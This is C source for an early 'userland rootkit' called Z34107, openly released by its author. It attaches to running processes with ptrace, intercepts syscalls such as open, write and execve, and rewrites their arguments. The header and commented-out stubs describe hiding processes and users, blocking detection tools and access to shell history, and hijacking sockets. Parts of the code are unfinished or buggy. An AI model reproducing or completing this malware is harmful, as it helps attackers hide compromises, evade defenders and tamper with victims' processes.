/**************************************************************
 *                    Z34107 v0.01 (Public Version)           *
 *           ~=The userland rootkit from hell=~               *
 *    Author: pasv (pasvninja@gmail.com)                      *
 *    Greetz:                  *
 **************************************************************
 * Description:                                               *
 * Just when you thought patching your kernel with the latest *
 * and greatest security enhancements, installing the best    *
 * host based intrusion detection systems money can buy was   *
 * going to tell you if I got into your systems... Here it is *
 * the Zealot of all rootkits.                                *
 **************************************************************
 * Features (public version):
 * Universal process infection
 * Anti-Anti-rootkit technologies (not a typo ;)
 * process hiding/user hiding
 * ioctl interface runtime process controller
 * module-monitoring 
 * on-the-fly process hiding via wrapper program
 * signature based blacklisting of detection tools
 * socket hijacking based on magic strings
 * 
 *************/

/*
* Z34107 is free software: you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* Z34107 is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with Z34107.  If not, see <http://www.gnu.org/licenses/>.
*/

#define PROG "Z34107"
#define VERSION "v0.01"
#define AUTHOR "pasv (pasvninja@gmail.com)"

//#include <linux/user.h>
//#include <linux/dirent.h> //also evil
#include <linux/types.h>
#include <sys/reg.h> //i hate this file
#include <sys/user.h>
#include <sys/procfs.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <signal.h>
//#include <sys/types.h>
#include <sys/wait.h>
#include <asm/unistd.h>
//#include <dirent.h>
#include <strings.h>


struct linux_dirent64 {
	__u64 d_ino;
	__s64 d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[0];
};


void getdata(pid_t child, long addr, char *str, int len) {
    char *laddr;
    int i, j;
    union u {
            long val;
            char chars[sizeof(long)];
    }data;
    i = 0;
    j = len / sizeof(long);
    laddr = str;
    while(i < j) {
        data.val = ptrace(PTRACE_PEEKDATA,
                          child, addr + i * 4,
                          NULL);
        memcpy(laddr, data.chars, sizeof(long));
        ++i;
        laddr += sizeof(long);
    }
    j = len % sizeof(long);
    if(j != 0) {
        data.val = ptrace(PTRACE_PEEKDATA,
                          child, addr + i * 4,
                          NULL);
        memcpy(laddr, data.chars, j);
    }
    str[len] = '\0';
}

void putdata(pid_t child, long addr, char *str, int len) {
    char *laddr;
    int i, j;
    union u {
            long val;
            char chars[sizeof(long)];
    }data;
    i = 0;
    j = len / sizeof(long);
    laddr = str;
    while(i < j) {
        memcpy(data.chars, laddr, sizeof(long));
        ptrace(PTRACE_POKEDATA, child,
               addr + i * 4, data.val);
        ++i;
        laddr += sizeof(long);
    }
    j = len % sizeof(long);
    if(j != 0) {
        memcpy(data.chars, laddr, j);
        ptrace(PTRACE_POKEDATA, child,
               addr + i * 4, data.val);
    }
}

void p_getstr(int pid, char *str, long addr) {
	int i=0,j=0;
	long temp;
	while(1) {
		temp=ptrace(PTRACE_PEEKDATA, pid, addr+(4*i), 0);
		memcpy(str+(4*i), &temp, 4);
		for(j=0;j<4;j++) {
			if(str[(4*i)+j] == '\0') return;
		}
		i++;
	}
}

struct linux_dirent64 *get_dirent (int pid, long addr) {
	int i=0;
	int len=sizeof(struct linux_dirent64);
	struct linux_dirent64 *tmp;
	char *rcv;
	tmp=(struct linux_dirent64 *)rcv;
	while(len >= 0) {
		len-=4;
		//(rcv+(4*i)) = (char) ptrace(PTRACE_PEEKDATA, pid, addr+(4*i), 0);
		strcat(rcv, (char *) ptrace(PTRACE_PEEKDATA, pid, addr+(4*i), 0));
		i++;
	}
	return tmp;
}

/***************************************************************************
 *               THE SYSCALL HANDLERS                                      *
 ***************************************************************************/

/*
int syscall_getdents64(int pid, struct user_regs_struct regz) {
	int in, res, j;
	struct linux_dirent64 dirp;
	
	if(in==0) {
		printf("inside syscall\n");
		in=1;
		p[0]=ptrace(PTRACE_PEEKUSER, pid, EBX*4, 0);
		p[1]=ptrace(PTRACE_PEEKUSER, pid, ECX*4, 0);
		count=p[2]=ptrace(PTRACE_PEEKUSER, pid, EDX*4, 0);
	}
	else { // out of the syscall
		in=0;
		printf("outside syscall\n");
   		//dirent=get_dirent(pid, p[1]);
		res=(long) ptrace(PTRACE_PEEKUSER, pid, EAX*4, NULL);
		j=0;
		while(j<res) {
			getdata(pid,(p[1]+j),dirp,sizeof(struct linux_dirent64));
			getdata(pid,p[1]+j+sizeof(struct linux_dirent64),dirp, (sizeof(struct linux_dirent64)-dirp_d_reclen)(;
			if(!strcmp(dirp->d_name,TARGET)) printf ("WE FOUND IT\n");
			j+= dirp->d_reclen;
		}
	}
}
*/

/*
int syscall_open(int pid, struct user_regs_struct regs) {
	long path_addr;
	char *path= (char *)malloc(1000);
	int flags;
	//regs.eax = 0;
	static int in_syscall;
	static int is_match;
	if(in_syscall == 0) {
		in_syscall=1;
		path_addr=ptrace(PTRACE_PEEKUSER, pid, EBX*4, 0);
		flags=ptrace(PTRACE_PEEKUSER, pid, ECX*4, 0);
		p_getstr(pid, path, path_addr);
		
		if(strstr(path, ".bash_history") != NULL) {
		    printf("[PID:%d] file access spotted, now blocking it\n", pid);
		    is_match = 1;
		    //putdata(pid, path_addr, "/noexist\0", 9)
		    
		}
		printf("open(%s,%x)!\n", path, flags);
	}
	else { // this is the syscall exiting
	    if(is_match) {
		regs.eax=0;
		ptrace(PTRACE_SETREGS, pid, NULL, &regs);
		is_match=0;
	    }
	    in_syscall=0;
	}
}
*/
// This is clone..
pid_t syscall_fork(int pid, struct user_regs_struct regs) {
    static in_syscall;
    
    if(in_syscall == 0) {
	in_syscall = 1;
	printf("entering fork/clone()\n");
    }
    else { //exit call
	in_syscall = 0;
	printf("FORK()'s return pid: %d\n", regs.eax);
	return(regs.eax);
    }

}

int syscall_execve(int pid, struct user_regs_struct regs) {
    static in_syscall;
    long path_addr;
    char *path= (char *)malloc(1000);
    //entering the system call
    if(in_syscall == 0) {
	path_addr=ptrace(PTRACE_PEEKUSER, pid, EBX*4, 0);
	p_getstr(pid, path, path_addr);
	printf("caught execve(\"%s\")\n", path);
	free(path);
	in_syscall = 1;
    }
    else {
	in_syscall = 0;
    }
    
}

// Remember in later versions to take the edx from the write call for the len.. looks
// funky otherwise
int syscall_write(int pid, struct user_regs_struct regs) {
    static in_syscall;
    long buf_addr, esp_addr;
    char *buf= (char *)malloc(1000);
    //entering the system call
    if(in_syscall == 0) {
	buf_addr=ptrace(PTRACE_PEEKUSER, pid, ECX*4, 0);
	esp_addr = regs.esp;
	esp_addr = esp_addr - 0x24; // We're gunna put our buffer on the stack
	p_getstr(pid, buf, buf_addr);
	printf("caught write(\"%s\")\n", buf);
	printf("attempting to modify..");
	putdata(pid, esp_addr, "FunkyTOWN\0", 10);
	regs.ecx=esp_addr; // put the stack pointer in write(x, HERE, x)
	ptrace(PTRACE_SETREGS, pid, NULL, &regs);
	free(buf);
	in_syscall = 1;
    }
    else {
	in_syscall = 0;
    }
    
}

// This is our new syscall_open modify arg test.. will soon be a main component
int syscall_open(int pid, struct user_regs_struct regs) {
    static in_syscall;
    long buf_addr, esp_addr;
    char *buf= (char *)malloc(1000);
    //entering the system call
    if(in_syscall == 0) {
	buf_addr=ptrace(PTRACE_PEEKUSER, pid, EBX*4, 0);
	esp_addr = regs.esp;
	esp_addr = esp_addr - 1000; // We're gunna put our buffer on the stack, mistake was bade before, 0x4 aint enuff
	p_getstr(pid, buf, buf_addr);
	printf("caught open(\"%s\")\n", buf);
	printf("attempting to modify..\n");
	putdata(pid, esp_addr, "/tmp/other\0", 11);
	regs.ebx=esp_addr; // put the stack pointer in open(HERE, x)
	ptrace(PTRACE_SETREGS, pid, NULL, &regs);
	free(buf);
	in_syscall = 1;
    }
    else {
	in_syscall = 0;
    }
    
}

/**************************End of syscall handlers*********************/

int hookem(int pid) {
	if(pid == 0 || pid == 22) return;
	printf("Starting hookem() on pid %d\n", pid);
	int w;
	pid_t ret=0;
	struct user_regs_struct regz;

/*	
	long arg;
	int procfd;
	char procpath[MAXPATHLEN];

	sprintfs(procpath, "/proc/%d", pid);
	procfd=open(procpath, O_RDWR|O_EXCL);
	arg=PR_RLC;
	ioctl(procfd, PIOCSET, &arg);
	arg=PR_FORK;
	ioctl(procfd, PIOCSET, &arg); // thank you strace
*/	
	
	if(ptrace(PTRACE_ATTACH, pid, (char *) 1, NULL) != 0) { printf ("ptrace() phailed and so did you\n"); exit(-1); }
	
	/* the syscall taker loop */
	while(1) {
		wait(&w);
		if(WIFEXITED(w)) break;
		ptrace(PTRACE_GETREGS, pid, 0, &regz);
		switch (regz.orig_eax) {
//			case __NR_stat64: syscall_stat64(pid,regz); break; // various
			case __NR_open: syscall_open(pid,regz); break; // various
//			case __NR_getdents64: syscall_getdents64(pid,regz); break; // HIDE :D
			// case __NR_fork: syscall_fork(pid,regz); break; // to follow procs -- this needs to be clone()
			case __NR_clone: 
			    break;
			    ret=syscall_fork(pid,regz);
			    printf("attempting to follow after pid: %d\n", ret);
			    ptrace(PTRACE_DETACH, pid, NULL, 0);
			    hookem(ret); 
			    break; // clone <-> fork
//			case __NR_unlink: syscall_unlink(pid,regz); break; // protection
//			case __NR_kill: syscall_kill(pid,regz); break; // protection
//			case __NR_read: syscall_read(pid,regz); break; // various
			case __NR_write: syscall_write(pid,regz); break; // various
//			case __NR_init_module: syscall_init_module(pid,regz); break; // to hijack/evasion
			case __NR_execve: syscall_execve(pid,regz); break; // to monitor/evasion
//			case __NR_bind: syscall_bind(pid,regz); break; // to hijack connections/monitor
//			case __NR_accept: syscall_accept(pid,regz); break; // to hijack connections
//			case __NR_ioctl: syscall_ioctl(pid,regz); break; // to control backdoor
//			case __NR_ptrace: syscall_ptrace(pid,regz); break; // careful-- evasion
//			case __NR_delete_module: syscall_delete_module(pid,regz); break; // -- because we're such dicks
		}
		ptrace(PTRACE_SYSCALL, pid, 0, 0);
	}
}

int main (int argc, char **argv) {
	int pid;
	int target_list[1000];
	nice(-19);
	// get_procs(target_list);
	pid=atoi(argv[1]); // Just test it on one pid for now
	hookem(pid);
}

